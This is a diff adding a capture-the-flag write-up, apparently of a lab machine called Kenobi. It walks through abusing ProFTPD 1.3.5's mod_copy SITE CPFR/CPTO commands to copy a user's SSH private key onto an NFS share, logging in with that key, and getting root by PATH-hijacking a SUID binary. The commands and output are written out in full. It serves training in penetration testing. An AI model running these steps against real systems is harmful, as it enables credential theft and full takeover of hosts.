@@ -59,4 +59,127 @@ There we can found **log.txt** file, let's back to our machine than use ``smbget
 smbget -R smb://10.10.239.150/anonymous
 ```
 
+Using nmap script ``nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.46.244``
+we can see that there's a mount /var
 
+Nest, let's search more information, there we can see that they using proFTPD for FTP server.
+Let's connect it:
+```bash
+ftp 10.10.46.244 -p 21
+Connected to 10.10.46.244.
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.46.244]
+```
+They use proFTPF 1.3.5, it says that this service is vulenrable in the past. Using searchsploit, we can see what exploit might be usefull to attack this service.
+
+The Vulnerability was on the mod_copy module, where we able to copy content from a driectory to another wihtout send to the client, and back to the remote directory. The culnerability was, that anybody could perform the SITE CPFR and SITE CPFTO with leveraged privillage. Lets copy kenobi private key to the mounted, and mount it on our local:
+```bash
+nc 10.10.46.244 21    
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.46.244]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+
+mkdir mounted_dir
+sudo mount 10.10.46.244:/var mounted_dir
+```
+
+now we able to connect via ssh to the kenobi computer using his private key (id_rsa)
+```bash
+ssh -i id_rsa kenobi@10.10.46.244
+```
+
+Okay, now we're in the machine, what should we do next is laverage our privillage as root. let's find what cpmmand could we do as root?
+```bash
+sudo -l
+```
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+the result:
+```bash
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/menu
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/bin/umount
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+```
+
+/usr/bin/menu is not usual, lets run the command:
+```bash
+/usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+```
+weird program, but however, each has their own function. Let's see what commadn might be visible using strings command:
+```bash
+strings /usr/bin/menu
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+__isoc99_scanf
+puts
+__stack_chk_fail
+printf
+system
+__libc_start_main
+__gmon_start__
+GLIBC_2.7
+GLIBC_2.4
+GLIBC_2.2.5
+UH-`
+AWAVA
+AUATL
+[]A\A]A^A_
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :
+curl -I localhost
+uname -r
+ifconfig
+ Invalid choice
+```
+seems that they run without specifying hte location such as /usr/bin/*, so we might able to change the command path location.
+```bash
+kenobi@kenobi:~$ cd /tmp
+kenobi@kenobi:/tmp$ echo /bin/sh > curl
+kenobi@kenobi:/tmp$ chmod 777 curl
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# whomai
+/bin/sh: 1: whomai: not found
+# whoami
+root
+```
+voila we get the root access.
